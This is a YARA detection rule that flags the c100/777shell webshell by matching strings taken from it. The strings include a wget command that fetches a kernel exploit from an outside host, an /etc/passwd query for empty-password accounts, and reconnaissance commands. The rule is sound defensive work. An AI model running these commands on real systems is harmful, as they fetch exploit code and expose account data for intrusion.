rule Webshell_c100
{
	meta:
		description = "Detects Webshell - rule generated from from files c100 v. 777shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash4 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash5 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		os = "windows,linux,macos,ios,android"
		filetype = "script"

	strings:
		$s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
		$s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
		$s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
		$s4 = "which wget curl w3m lynx" ascii
		$s6 = "netstat -atup | grep IST" ascii

	condition:
		filesize <685KB and 2 of them
}
